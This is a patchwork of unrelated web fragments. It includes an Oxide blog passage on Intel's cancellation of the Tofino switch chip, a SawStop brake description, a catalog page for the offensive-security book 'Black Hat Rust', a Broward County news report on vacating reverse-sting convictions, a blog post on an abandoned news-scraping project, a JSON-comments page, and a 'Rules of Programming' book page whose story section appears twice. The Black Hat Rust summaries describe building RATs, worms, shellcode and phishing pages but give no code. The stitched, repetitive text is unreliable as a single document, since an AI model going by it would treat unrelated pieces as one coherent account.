dropped a must-listen episode on Intel</a> in which he
cites the paying out of billions of dollars of dividends over Gelsinger’s tenure as an early and serious blunder.)</p>
<p>Beyond being merely expensive and risky, the newly-christened Intel Foundry Services (IFS) had another, deeper problem:  the culture at Intel
didn’t really seem amenable to the level of customer engagement that foundry customers (rightfully) expect.  And this was compounded by
the trust issue that we at Oxide felt with Intel over Tofino:  why would a customer trust their future to something chancy like IFS?  Absent the
availability of 18A, the only
answer that Intel ever seemed to give on this was to wrap itself in the flag:  that one should choose IFS solely because the fabs are on US soil.  In this regard,
it reminds me (ironically?) of
a long-ago CPU startup, <a href="https://en.wikipedia.org/wiki/Transmeta">Transmeta</a>.  They had interesting technology, but unable to compete with Intel on absolute
performance, they retreated to power efficiency.  Transmeta was implicitly relying on the fact that Intel wouldn’t release a lower power part,
but Intel promptly turned around and introduced the
<a href="https://en.wikipedia.org/wiki/Pentium_M">Pentium-M</a> line — and that was more or less it for Transmeta.  Similarly, is Intel assuming that TSMC is
unable to build fabs in the US or that the US government wouldn’t see such fabs as addressing geopolitical concerns?
If so, it feels like a
<a href="https://www.commerce.gov/news/press-releases/2024/11/biden-harris-administration-announces-chips-incentives-award-tsmc">bad assumption on both fronts</a>.</p>
<p>Skepticism of Gelsinger’s plan for Intel aside,
we at Oxide anxiously watched Tofino.  At Intel,
the team itself believed it was safe under Gelsinger,
and things did indeed seem okay for a while.
Fast-forward two years to 2023, and we got an urgent request for a call from the executive leading the Tofino effort.  Fearing the worst, we were honestly
somewhat relieved to learn that Tofino hadn’t been killed outright — but all future development of the part had been cancelled.
We were on the cusp of
<a href="https://oxide-and-friends.transistor.fm/episodes/shipping-the-first-oxide-rack-your-questions-answered">shipping our first product</a>,
and the switch was working, so our own die was cast.  And we were reassured by the Tofino team, who (to their great credit!) assured us
that they would support us, even going to far as to draft a formal letter from Intel that we could share with our own customers expressing
Intel’s ongoing support of Tofino.</p>
<p>While the situation for Tofino was obviously dire, I also felt we had some stoppage time; could we get in front of Gelsinger to explain why
killing switching silicon in 2023 feels a lot like
walking away from the GPGPU in 2011?  No, as it turns out, we couldn’t.  (And nor, apparently, could anyone else who was buying the part.)
Everyone we dealt with at Intel agreed that the move
was short-sighted, but as with so many things Intel (that culture problem again!), they felt powerless to change it.</p>
<p>Tofino was clearly living on borrowed time, and we were disappointed (though frankly not that surprised) when we were notified earlier this year
that Tofino was being formally killed.  It’s a credit to the Tofino team (or what was left of it at that point) that they continued to be very direct with us;
this was (clearly) a decision that they disagreed with, and they were especially apologetic for the sloppy manner in which the end-of-life
was being handled (which made a mockery of Intel’s own process for end-of-life management).</p>
<p>In the end, for all of the decisions that we made at Oxide — out of all of the companies and parts that we bet on, out of all the
partners that we had sent
<a href="https://rfd.shared.oxide.computer/rfd/68">RFD 68 Partnership as Shared Values</a> to — only one had walked away from us, and it was
the largest and best capitalized partner, who had repeatedly told us that they would not do exactly what they in fact did.
How can Intel ever expected to be trusted when they treat partners this way?</p>
<p>For Oxide, fortunately, Intel might have done us a favor in the limit.  While we were grateful to Tofino for allowing us to prove out our ideas on programmable networking,
we had issues with it too.  Specifically, Tofino’s software and instruction set architecture remained needlessly proprietary.  We believe
that switching silicon is awaiting its "x86 moment", when open source software can be implemented for a well-defined ISA — and we were never
going to get there with Tofino.
As we looked for our post-Tofino future, we were delighted to find the Xsight Labs team and their
<a href="https://www.businesswire.com/news/home/20241014894143/en/Xsight-Labs-Announces-X2-Programmable-SDN-Ethernet-Switches-for-Hyperscale-and-Edge-Data-Centers-Optimized-for-the-AI-Factory-Era">X2 ASIC</a>.  We are going to have a <strong>lot</strong> more to say about this part,
but suffice it to say that we see in X2 both the strengths that we saw in Tofino and <em>also</em> the potential to be
the open substrate for programmable networking writ large.  Stay tuned!</p>
<p>I have great reverence for Intel and its extraordinary history, and I would never count them out (the resurrection of a clinically-dead AMD shows
what is possible!), but I also won’t be integrating with any of their technology until their acute cultural issues are addressed.
With regard to these cultural issues (and his other strengths aside), Pat Gelsinger was indisputably wrong for Intel.</p>

It operates by running an electrical current through the saw blade, which is continuously monitored by the brake cartridge. When the blade comes into contact with skin, the electrical signal is disrupted, triggering the brake mechanism. In less than 5 milliseconds—faster than a car airbag—the actuator assembly unleashes the aluminum pawl and halts the blade spinning at 3,500 RPM. The saw blade teeth bite into it, and the blade’s momentum causes it to retract under the table to prevent further injury.</p><p>Take the 3D reconstruction of the new SawStop for a spin in the Voyager window below.

<p dir="auto">While the <a href="https://doc.rust-lang.org/book/" rel="nofollow">Rust Book</a> does an excellent job teaching <strong>What is</strong> Rust, a book about <strong>Why</strong> and <strong>How</strong> to Rust was missing.</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Summary</h2><a id="user-content-summary" aria-label="Permalink: Summary" href="#summary"></a></p>
<p dir="auto">Whether in movies or mainstream media, hackers are often romanticized: they are painted as black magic wizards, nasty criminals, or, in the worst cases, as thieves with a hood and a crowbar.
In reality, the spectrum of the profile of the attackers is extremely large, from the bored teenager exploring the internet to sovereign State's armies as well as the unhappy former employee.</p>
<p dir="auto">What are the motivations of the attackers? How can they break seemingly so easily into any network? What do they do to their victims?
We will put on our black hat and explore the world of offensive security, whether it be cyber attacks, cybercrimes, or cyberwar.
Scanners, exploits, phishing toolkit, implants... From theory to practice, we will explore the arcane of offensive security and build our own offensive tools with the Rust programming language, Stack Overflow's most loved language for five years in a row.</p>
<p dir="auto">Which programming language allows to craft shellcodes, build servers, create phishing pages? Before Rust, none! Rust is the long-awaited one-size-fits-all programming language meeting all those requirements thanks to its unparalleled guarantees and feature set. Here is why.</p>

<p dir="auto">Free Updates and DRM Free, of course :)</p>
<p dir="auto"><h2 tabindex="-1" dir="auto">Who this book is for</h2><a id="user-content-who-this-book-is-for" aria-label="Permalink: Who this book is for" href="#who-this-book-is-for"></a></p>
<p dir="auto">This is NOT a 1000th tutorial about sqlmap and Metasploit, nor will it teach you the fundamentals of programming.</p>
<p dir="auto">Instead, it's a from-theory-to-practice guide and you may enjoy it if any of the following:</p>
<ul dir="auto">
<li>You keep screaming "show me the code!" when reading about cyber attacks and malwares</li>
<li>You are a developer and want to learn security</li>
<li>You are a security engineer and want to learn Rust programming</li>
<li>You want to learn real-world and idiomatic rust practices</li>
<li>You believe that the best defense is thinking like an attacker</li>
<li>You learn by building and love to look under the hood</li>
<li>You value simplicity and pragmatism</li>
<li>You develop your own tools and exploits with Python, Ruby, C, Java...</li>
<li>You want to learn real-world offensive security, not just pentesting</li>
<li>You want to start making money with bug bounty programs</li>
<li>You prefer getting things done over analysis paralysis</li>
</ul>
<p dir="auto">But I repeat, this book is NOT a computer science book.</p>

<p dir="auto">How to perform effective reconnaissance? In this chapter, we will build a multi-threaded scanner in order to automate the mapping of the target.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/3" rel="nofollow">3 - Going full speed with async</a></h4><a id="user-content-3---going-full-speed-with-async" aria-label="Permalink: 3 - Going full speed with async" href="#3---going-full-speed-with-async"></a></p>
<p dir="auto">Unfortunately, when a program spends most of its time in I/O operations, multi-threading is not a panacea. We will learn how async makes Rust code really, really fast and refactor our scanner to async code.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/4" rel="nofollow">4 - Adding modules with Trait objects</a></h4><a id="user-content-4---adding-modules-with-trait-objects" aria-label="Permalink: 4 - Adding modules with Trait objects" href="#4---adding-modules-with-trait-objects"></a></p>
<p dir="auto">We will add more heterogeneous modules to our scanner and will learn how Rust's type system helps create properly designed large software projects.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/5" rel="nofollow">5 - Crawling the web for OSINT</a></h4><a id="user-content-5---crawling-the-web-for-osint" aria-label="Permalink: 5 - Crawling the web for OSINT" href="#5---crawling-the-web-for-osint"></a></p>
<p dir="auto">Leveraging all we learned previously, we will build an extremely fast web crawler to help us find the needles in the haystack the web is.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Part II: Exploitation</h3><a id="user-content-part-ii-exploitation" aria-label="Permalink: Part II: Exploitation" href="#part-ii-exploitation"></a></p>

<p dir="auto">Once the external reconnaissance performed, it's time to find entry points. In this chapter we will learn how automated fuzzing can help us to find vulnerabilities that can be exploited to then gain access to our target's systems.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/7" rel="nofollow">7 - Exploit development</a></h4><a id="user-content-7---exploit-development" aria-label="Permalink: 7 - Exploit development" href="#7---exploit-development"></a></p>
<p dir="auto">Rust may not be as fast as python when it comes to iterating on quick scripts such as exploits, but as we will see, its powerful type and modules system make it nonetheless a weapon of choice.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/8" rel="nofollow">8 - Writing shellcodes in Rust</a></h4><a id="user-content-8---writing-shellcodes-in-rust" aria-label="Permalink: 8 - Writing shellcodes in Rust" href="#8---writing-shellcodes-in-rust"></a></p>
<p dir="auto">Shellcode development is an ungrateful task. Writing assembly by hand is definitely not sexy. Fortunately for us, Rust, one more time, got our back! In this chapter we will learn how to write shellcodes in plain Rust with no_std.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/9" rel="nofollow">9 - Phishing with WebAssembly</a></h4><a id="user-content-9---phishing-with-webassembly" aria-label="Permalink: 9 - Phishing with WebAssembly" href="#9---phishing-with-webassembly"></a></p>
<p dir="auto">When they can't find exploitable hardware or software vulnerability, attackers usually fall back to what is often the weakest link in the chain: Humans.
Again, Rust comes handy and will let us create advanced phishing pages by compiling to WebAssembly.</p>
<p dir="auto"><h3 tabindex="-1" dir="auto">Part III: Implant development</h3><a id="user-content-part-iii-implant-development" aria-label="Permalink: Part III: Implant development" href="#part-iii-implant-development"></a></p>

<p dir="auto">A RAT (for Remote Access Tool), also known as implant or beacon, is a kind of software used to perform offensive operations on a target's machines. In this chapter we will build our own RAT communicating to a remote server and database.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/11" rel="nofollow">11 - Securing communications with end-to-end encryption</a></h4><a id="user-content-11---securing-communications-with-end-to-end-encryption" aria-label="Permalink: 11 - Securing communications with end-to-end encryption" href="#11---securing-communications-with-end-to-end-encryption"></a></p>
<p dir="auto">The consequences of our own infrastructure being compromised or seized can be disastrous. We will add end-to-end encryption to our RAT's communication in order to secure its communications and avoid leaving traces on our servers.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/12" rel="nofollow">12 - Going multi-platforms</a></h4><a id="user-content-12---going-multi-platforms" aria-label="Permalink: 12 - Going multi-platforms" href="#12---going-multi-platforms"></a></p>
<p dir="auto">Today's computing landscape is extremely fragmented. From Windows to macOS, we can't target only one Operating System to ensure the success of our operations. In this section we will see how Rust's ecosystem is extremely useful when it comes to cross-compilation.</p>
<p dir="auto"><h4 tabindex="-1" dir="auto"><a href="https://kerkour.com/black-hat-rust/13" rel="nofollow">13 - Turning into a worm to increase reach</a></h4><a id="user-content-13---turning-into-a-worm-to-increase-reach" aria-label="Permalink: 13 - Turning into a worm to increase reach" href="#13---turning-into-a-worm-to-increase-reach"></a></p>
<p dir="auto">Once the initial targets compromised, we will capitalize on Rust's excellent reusability to incorporate some parts of our initial scanner to turn our RAT into a worm and reach more targets only accessible from the target's internal network.</p>

(CBS12) — </span>For three years, the Broward County Sheriff’s Office produced its own crack cocaine, so it could sell it to people that deputies would then arrest for buying crack cocaine.</p><p>It was a practice the Florida state Supreme Court repeatedly described as “outrageous” in its 1993 ruling that such reverse-stings violated an individual’s right to due process. More than 30 years later, though, a routine audit of documents found hundreds of those arrests and convictions are still on the books and part of people’s criminal records.</p><p>On Friday, the State Attorney for Broward County Harold Pryor announced his office planned to do something about that, declaring, “it is never too late to do the right thing.”</p><p>“These records may be a dim memory or an unfortunate part of history to many, but they have had a long-lasting and severe impact on the lives of the people who were arrested – as well as their families and the wider community,” Pryor added.</p><p>The State Attorney’s Office explained that despite the Supreme Court’s decision, many of the cases were never vacated. That means they could still weigh on the lives of those prosecuted under the unconstitutional program, affecting their ability to get a job, find a home, or appearing in criminal history checks.</p><p>Anyone who thinks they may be affected by the effort is asked to reach out to the State Attorney’s Office. According to numbers cited in the statement, some estimates have placed the number of cases involved may be as high as 2,600.</p><p><strong>See Also: <a href="https://cbs12.com/news/local/deputies-link-20-year-old-suspect-to-belle-glade-revenge-shooting-crime-florida-man-shooting-belle-glade-palm-beach-county-florida-december-6-2024#" target="_blank" title="https://cbs12.com/news/local/deputies-link-20-year-old-suspect-to-belle-glade-revenge-shooting-crime-florida-man-shooting-belle-glade-palm-beach-county-florida-december-6-2024#">Deputies link 20-year-old suspect to Belle Glade revenge shooting</a></strong></p><p>Broward County Sheriff Gregory Tony was made aware of the plan to vacate or remove the judgements and sentences for those who were arrested and convicted as part of those reverse-stings and supports the plan, according to Pryor’s office.</p><p>“These matters were well before our tenures. However, I am of the opinion that the State has an ethical duty and obligation to correct this injustice before destruction [of old records] is initiated,” Pryor wrote in a letter to Tony on Thursday explaining his office’s intentions.</p><p>Many of the records discovered during the audit were still on hand even though they were past the statutory requirement to be retained.

      <p>⭐ I spent &gt;1,600 days working on a data science project that then failed because I lost interest. This article is to cope
with the failure and maybe help you (and me) to finish successful data science projects by summarising
a few learnings into a checklist, see <a href="#learnings">below</a>.</p>
<p>Nobody really likes to speak about failures. The same holds true for failed data science projects.
In this text, I document my most recent data science project which I worked on for 1,600 days -
days that I won’t get back despite the project failing.
Ultimately, it is important to communicate about failed projects similarly to successful projects
as those failed ones are the ones that help us to acquire scar tissue (<a href="https://youtu.be/I2ZK3ngNvvI?si=MkoLkVLl34ChHdW0&amp;t=111">thanks Andrej</a>) which makes us better data science
practitioners. And the latter is what we should all strive&nbsp;for!</p>

<h2><a href="#table-of-contents">The planned project <span>&amp;</span> its&nbsp;failure</a></h2>
<p>After completing <a href="https://lellep.xyz/blog/cycling-in-marburg-1-intro.html">a substantial hobby data analysis project</a> involving 1.5 million Nextbike
datapoints, I wanted to explore a different data modality: text. While my previous
work had focused on numerical analysis, I wanted to explore text as data source while delivering
some value. This opportunity presented itself in March 2020, just as <span>COVID</span>-19 began making
headlines. I discovered that Germany’s public news outlet, <a href="https://www.tagesschau.de/">Tagesschau</a>,
had launched a <span>COVID</span>-focused newsticker, aggregating everything from case numbers to policy changes
and breaking&nbsp;incidents.</p>
<p>The <span>COVID</span> newsticker provided both a compelling topic and an ideal text data
source. My plan was to scrape the entire newsticker over time and analyse it for both
metadata patterns, such as posting frequency, and deeper semantic insights about the people,
topics and countries involved. When <span>COVID</span> became less of an issue the Tagesschau shut down their
<span>COVID</span> newsticker in 2022-Q3 but launched a new one covering the emerging Ukraine-Russia war.
I seamlessly extended my project to collect also this new data&nbsp;stream.</p>
<p>I stopped working on the project in 2024-Q3 after 1,600 days of collecting data and some short data exploration
because life got busier, my priorities shifted and I had less free time at hand. Unfortunately, I never performed
any sort of serious data analyses except aforementioned short data exploration that I did after one week
into the project in&nbsp;2020-Q2.</p>
</div>
<div id="data-source-tagesschau-newsticker">
<h2><a href="#table-of-contents">Data source: Tagesschau&nbsp;newsticker</a></h2>
<p>The raw data format of the newsticker is shown in the figure below and explained in words below
the&nbsp;figure.</p>

</a></p><p>Raw format of newsticker data on Tagesschau website. Explanation see main&nbsp;text.</p>
</div>
<p>Every day featured a list of short news stories (shown in green),
each containing a timestamp, headline, body text and optional multimedia elements like Twitter/X
feeds, videos or audio clips. Each day normally linked back to the previous&nbsp;day.</p>
<p>I collected all the URLs and downloaded the underlying raw data from 2020-Q1 to 2024-Q3 for around
1,600 days while working towards my PhD and writing up my thesis. Then, I stopped because I lost
interest in the project and didn’t have time to continue it&nbsp;anymore.</p>
</div>
<div id="implementation-of-project-system-design">
<h2><a href="#table-of-contents">Implementation of project: System&nbsp;Design</a></h2>
<p>The system is a semi-automatic data pipeline which extracts raw data from the German news outlet Tagesschau
once a day and turns the raw unstructured data into structured news snippets that make up a dataset.
If I would have finished the project, this dataset would then have been released and used for
a number of analyses using&nbsp;Python.</p>
<p>The project system design is shown visually in the below figure and explained with words&nbsp;afterwards.</p>
<div>
<p><a href="https://lellep.xyz/blog/images/failed_data_science_project/2024-11-01_system_design.jpg">
<img alt="" src="https://lellep.xyz/blog/images/failed_data_science_project/2024-11-01_system_design.jpg">
</a></p><p>System design: Semi-automatic data pipeline for dataset curation that is used for&nbsp;analyses.</p>
</div>
<p>The data collection process involved a daily ritual of manually visiting the Tagesschau website to
capture links to both the <span>COVID</span> and later Ukraine war newstickers. While this manual approach constituted
the bulk of the project’s effort, it was necessitated by Tagesschau’s unstructured <span>URL</span> schema, which
made automated link collection&nbsp;impractical.</p>
<p>Every four to eight weeks, I would use Python to batch process these accumulated URLs, downloading the
underlying <span>HTML</span> pages as raw data. The emphasis on preserving raw <span>HTML</span> proved vital when Tagesschau
repeatedly altered their newsticker <span>DOM</span> structure throughout Q2 2020. This experience underscored a
fundamental data engineering principle: <strong>raw data is king</strong>. While parsers can be rewritten, lost data is&nbsp;irretrievable.</p>
<p>The technical pipeline itself was straightforward: Python scripts with BeautifulSoup4 parsed the
<span>HTML</span> pages into structured news items, which were then stored in an SQLite database. The end goal
was twofold: to share this unique dataset with the broader community and to conduct what I optimistically
labeled as “❤️ Cool Analyses” - though these analyses would ultimately remain&nbsp;unrealized.</p>
<p>Many parts of the project were on autopilot. That is except for two parts: (1) the manual
<span>ETL</span> pipeline part and (2) the actual analyses. While part (2) would have been the actual fun part, I spent
1,600 days doing (1) starting in ~2020-03 and ultimately abandonning the project in&nbsp;2024-Q3.</p>
</div>
<div id="my-learnings-for-me-and-others">
<h2><a href="#table-of-contents">My learnings for me and&nbsp;others</a></h2>
<p>In the future, I will use the following short checklist of advice to conduct successful (data science) projects.
The list is roughly ordered by decreasing&nbsp;relevance:</p>
<ol>
<li>Consider story telling from day one. While <a href="https://lellep.xyz/blog/cycling-in-marburg-1-intro.html">my Nextbike project</a>
had that built-in, this project would have been much more difficult to talk about because of the
negative topics of <span>COVID</span> and a&nbsp;war.</li>
<li>Get first analyses results out quickly based on a small dataset and don’t just collect data
up front to “analyse it later” - this is what I did here and it’s bad. Data postprocessing and
releasing some results as teasers are mostly important for you as after all, quick results keep
us motivated; e.g. for me, the present Tagesschau project was very interesting in the beginning
but I lost interest over time because of mindless data collecting. Ideally, given these first
results follow “<a href="https://austinkleon.com/show-your-work/">Show Your Work</a>” approach by making
the results public; this is super difficult for&nbsp;perfectionists.</li>
<li>Automate the h*ll out of your data science project (in particular the data acquisition part)
to reduce daily friction. If the automation process takes considerable work, then perceive it as a separate
topic to speak about online, again following the “<a href="https://austinkleon.com/show-your-work/">Show Your Work</a>” approach. For example,
the manual step in the process of my project could have been a beautiful and innovative machine
learning opportunity. Back then, I would have trained a specialised model (or used a pretrained specialised model)
but since LLMs made so much progress during the runtime of this project from 2020-Q1 to 2024-Q4, I would now
rather consider a foundational model wrapped as an <span>AI</span> agent instead; for example, I would try to find a
foundation model to do the job of for example finding the right link on the Tagesschau website, which was
by far the most draining part of the whole&nbsp;project.</li>
<li>Data cadence is relevant: Do you have to collect the data yourself over a period of time?
If yes, how often do you have to collect it - as in how often per hour for example? For the present
project, I had to scrape data only once per day, which is doable manually. For <a href="https://lellep.xyz/blog/cycling-in-marburg-1-intro.html">my previous NextBike project</a>,
however, I scraped data every 30 seconds. Since I scaped an <span>API</span>, the automation of that process was fairly&nbsp;simple.</li>
<li>Store raw data if possible. This allows you to condense it&nbsp;later.</li>
<li>Consider using the cloud for simplicity, reliability and last but certainly not least developing
real-life employability skills (<em>I am looking at you, University, that often fails to deliver the latter</em>).</li>
</ol>
</div>
<div id="conclusion">
<h2><a href="#table-of-contents">Conclusion</a></h2>
<p>Go out and build&nbsp;something!</p>
<p>A failed data science project is part of the learning experience and contributes
to your battle scar tissue; battle scar tissue through projects is a great concept from Andrej Karpathy
(see <a href="https://youtu.be/I2ZK3ngNvvI?si=MkoLkVLl34ChHdW0&amp;t=111">here</a> and <a href="https://stevengong.co/notes/Scar-Tissue">there</a>)
<span>&amp;</span> certainly makes us better data&nbsp;practitioners.</p>
<p>Personally, I would have loved to use the beautiful applied <span>ML</span> opportunity of identifying the right
newsticker link on the Tagesschau website using <span>NLP</span> to remove any manual labour but unfortunately, I don’t have
the time to do so. Also, I would have loved to evaluate the ~100,000 news
snippets that I collected and shared the dataset - but I will not; although I still think that these news analyses
would be super&nbsp;interesting!</p>
<p>Good news is that Tagesschau keeps releasing newstickers like for example for the <span>US</span> election 2024.
If you’re interested in picking up the project and getting some battle scars in, then please
drop me a message - I am happy to share the whole project with no strings attached&nbsp;:-).</p>

    <p>I know what you've been told. Douglas Crockford said that
      <a href="https://www.json.org/">JSON</a> can't have comments. And
      you accepted that. Understandable mistake; we've all been
      there.</p>

    <p>But I'm here to tell you there's another way,
      because <em>Douglas Crockford is not your dad</em>. You can put
      comments in JSON files <strong>if</strong> you know they're
      going to be read only by a reasonable parser. If you maintain a
      parser, you can make it accept comments and nothing bad will
      happen!</p>

    <h3>Reasonable Parsers</h3>
    <p>These ones will just do the right thing with no fuss:</p>

    <ul>
      <li><a href="http://dkolf.de/dkjson-lua/">dkjson</a> (Lua)</li>
      <li>TODO: list more</li>
    </ul>

    <h3>Not Completely Unreasonable Parsers</h3>
    <p>These ones can be configured to accept comments:</p>
    <ul>
      <li><a href="https://github.com/FasterXML/jackson">Jackson</a> (Java)</li>
    </ul>

    <h3>Unreasonable Parsers</h3>
    <p>These ones have not yet seen the light:</p>

  <h2>The Story of the Rules</h2><p>The Rules of Programming were born of exasperation.</p><p>I’d spent about a decade running programming teams at Microsoft, then cofounded the video game company Sucker Punch in 1997. Both companies have been successful­—in large part because of their ability to recruit and develop top-notch programming teams.</p><p>At Sucker Punch, that’s led to a 25-year run of successful games. The three <em>Sly Cooper</em> games, which let kids of all ages experience the thrilling life of the master raccoon thief Sly Cooper and his pals. The five <em>inFamous</em> games, which gave gamers superpowers and the choice to use them for good or evil. And our magnum opus, <em>Ghost of Tsushima</em>, where gamers play a lone samurai fighting back against the 1274 invasion of Japan.</p><p>A big part of the recruiting strategy at both Microsoft and Sucker Punch has been hiring smart young programmers, then training them in the ways of professional developers. This practice has been undeniably successful, but it also leads to a particular flavor of frustration.</p><p>I kept running into one particular problem over and over again. We’d bring a new programmer onto the team, often someone fresh out of college. I’d review some new feature they planned to introduce into the code, usually to solve a very simple problem—only to discover that they’d written code that attempted to solve a much bigger problem, one that included the very simple and concrete problem as a small subcase.</p><p>Aargh! We didn’t need that bigger problem solved! And we certainly didn’t need it solved right now! Invariably, the solution to the bigger problem was a mediocre solution to the simple problem we did have—more complicated to use, more complicated to understand, and capable of hiding a lot more bugs.

<p>The word <em>aphorism</em> itself was coined by Hippocrates around 400 BCE. Well, strictly speaking, the word he coined was Ἀφορισμός. That was the title of his book of rules for medical diagnosis and treatment, some of which are still spot on millennia later, like aphorism 13 from section 6—“a sneezing attack will cure a case of hiccups.” So true.</p>

  <h2>The Story of the Rules</h2><p>The Rules of Programming were born of exasperation.</p><p>I’d spent about a decade running programming teams at Microsoft, then cofounded the video game company Sucker Punch in 1997. Both companies have been successful­—in large part because of their ability to recruit and develop top-notch programming teams.</p><p>At Sucker Punch, that’s led to a 25-year run of successful games. The three <em>Sly Cooper</em> games, which let kids of all ages experience the thrilling life of the master raccoon thief Sly Cooper and his pals. The five <em>inFamous</em> games, which gave gamers superpowers and the choice to use them for good or evil. And our magnum opus, <em>Ghost of Tsushima</em>, where gamers play a lone samurai fighting back against the 1274 invasion of Japan.</p><p>A big part of the recruiting strategy at both Microsoft and Sucker Punch has been hiring smart young programmers, then training them in the ways of professional developers. This practice has been undeniably successful, but it also leads to a particular flavor of frustration.</p><p>I kept running into one particular problem over and over again. We’d bring a new programmer onto the team, often someone fresh out of college. I’d review some new feature they planned to introduce into the code, usually to solve a very simple problem—only to discover that they’d written code that attempted to solve a much bigger problem, one that included the very simple and concrete problem as a small subcase.</p><p>Aargh! We didn’t need that bigger problem solved! And we certainly didn’t need it solved right now! Invariably, the solution to the bigger problem was a mediocre solution to the simple problem we did have—more complicated to use, more complicated to understand, and capable of hiding a lot more bugs. But just saying that in the code review—that we didn’t need the bigger problem solved, that they should only try to solve problems they understand—was ineffective. New programmers kept doing it.</p><p>Out of frustration, I put my foot down. “OK,” I said. “Here’s the new rule. Until you have three examples of a problem, you’re not allowed to write a general solution.”</p><p>To my surprise and delight, this actually worked! Turning the general philosophy into a specific rule with specific criteria was an effective way of getting the message across. Sure, most of our new programmers made the premature generalization mistake once, but the rule helped them avoid making it again. It also helped them recognize when it <em>was</em> time to generalize. Fewer than three examples? Don’t generalize. Three or more? Start looking for opportunities.</p><p>The Rule worked because it was easy to remember, and the situations where it applied were easy to recognize. When coders could see when they started moving past the bounds of the well-defined problem at hand, they could take a step back, count the number of concrete examples of that sort of problem they’d run into, and make a better decision about whether to generalize or not. They wrote better code.</p><p>Over time, we found other important bits of Sucker Punch philosophy that could be distilled into easy-to-remember phrases—aphorisms.</p><p>There’s a long history of aphorisms—short, pithy statements that capture some essential truth. I bet you can rattle off many aphorisms from memory. Shoot, I could limit you to <em>bird-related</em> aphorisms, and you’d still be able to come up with at least two! I’ll offer a few: </p><ul data-rte-list="default"><li><p>Don’t count your chickens before they’re hatched.</p></li><li><p>A bird in the hand is worth two in the bush.</p></li><li><p>The early bird catches the worm.</p></li><li><p>Don’t put all your eggs in one basket.</p></li></ul><p>Aphorisms stick around because they work. They’re viral, in the modern sense—aphorisms have been “infecting” people with bits of wisdom for thousands of years. It’s not surprising that they’re an effective way of infecting new team members with the Sucker Punch coding philosophy. </p><p>So, bit by bit, what was once a single rule grew into a list of rules: the Rules of Programming. They represent many of the most important aspects of Sucker Punch engineering culture: the things that we believe have led to our success, the ideas that new coders on the team need to absorb to be effective. The things that even senior coders like me need reminding of at least once in a while!</p><p>And so I wrote this book to bring the Rules to a broader audience. I think you’ll find the book interesting and entertaining, and I hope it will help you on your own journey to write better code. </p>

  <p><em>The Rules of Programming</em> provides great insights for both new and experienced coders. Zimmerman’s style makes it an entertaining read, and the 21 rules are an important contribution to better software at a time when technology is pervasive in every part of business and society.<br><strong>Paul Daugherty<br>Group Chief Executive of Technology and CTO, Accenture</strong></p><p>Reading this book gives you a sense of what it’s like to work on that rarest of treats: the large, well-functioning engineering team. Each chapter presents hard-won lessons illustrated with code and leavened with interesting anecdotes from some very successful projects. Above all, Zimmerman’s book inculcates a proper sense of developer humility — working in a collective manner that acknowledges, and is resilient to, normal human fallibility and the gravity-like pull of complexity in growing projects. Reading this as a group would be a great team exercise.<br><strong>Jan Miksovsky<br></strong><a href="https://jan.miksovsky.com/" target="_blank"><strong>jan.miksovsky.com</strong></a></p><p><em>The Rules of Programming</em> fills in the gaps that most programming books and CS departments leave out—the practices that differentiate a novice programmer from a seasoned professional.<br><strong>Jasmin Patry<br>Rendering Lead, Sucker Punch</strong></p><p>On the one hand, Chris takes a certain pleasure putting his fingers on controversial opinions. And thanks to the precise examples being brought to the readers, challenging your own way of thinking is made a lot easier. On the other hand, Chris has put in words things that some of us are doing intuitively. Chris just made training way easier. A must read!<br><strong>Julien Merceron<br>Chief Technology Officer, Bandai Namco</strong></p><p>This book belongs in every professional software developer's toolkit. It is full of techniques that are sure to increase your productivity and your team's, reduce bugs, and result in more easily maintainable and extensible software systems.<br><strong>Chris Heidorn<br>Senior Staff Engineer, Sucker Punch</strong></p>

  <p><em>The Rules of Programming</em> combines great guidance for beginners with subtle lessons that may teach even the experts. Zimmerman keeps it fun, too—proving that it’s possible to be both entertaining and instructive.<br><strong>Mark Cerny<br>Lead System Architect, PlayStation 4 and 5</strong></p><p><em>The Rules of Programming</em> is full of pragmatic rules of thumb which any Software Engineer can use to level up their skills. I love the mix of pithy sayings and detailed concrete examples–such as "Generalization Takes Three Examples" with many code samples putting that rule to practice. I was fortunate to learn these lessons directly from Chris early in my career, and have successfully applied them across a wide variety of software disciplines. With this book, you have the opportunity to do the same.<br><strong>Chris Bentzel<br>Director of Software, Boston Dynamics</strong></p><p><em>The Rules of Programming</em> is a fun read and provides some insight into practical game engine development. The stories and guidelines presented should provide interesting food for thought for experienced programmers and valuable starting points for the less experienced.<br><strong>Adrian Bentley<br>Development Manager, Sucker Punch</strong></p><p>I really appreciate the set of helpful tools Chris provides that can be used for those critical 52/48 design/coding decisions that come up so often.<br><strong>David Oliver<br>Principal Group Engineering Manager, Microsoft</strong></p><p><em>The Rules of Programming</em> deftly articulates a lifetime of real-world engineering lessons into a fantastic handbook of core concepts that are both helpful reminders to experienced developers and a guidepost to those just starting their journey as software engineers. If you’re looking for practical ways to ensure the success of your project, you need to add this book to your library.<br><strong>Wes Grandmont III<br>Lead Technical Art Director, Sucker Punch</strong></p>

  <h2>Girls Who Code</h2><div><p>I decided that writing a book would be way more fun if it benefited a good cause. And I couldn't think of a better organization to support than Girls Who Code, the direct recipient for all royalties from this book.&nbsp;</p><p>&nbsp;Girls Who Code is working hard to help young women discover just how&nbsp; rewarding&nbsp;programming can be. When I graduated from college, over a third of computer science graduates were women. These days, it's more like a fifth. That's ridiculous. I think we'd all&nbsp;be better off with a more representative gender balance. You probably do, too.&nbsp;And supporting Girls Who Code through donations or volunteering is a step&nbsp;toward making that hope a reality.</p><p>&nbsp;Or even the small act of buying this book. Learn to write better code; support a good cause. Everybody wins.</p></div>

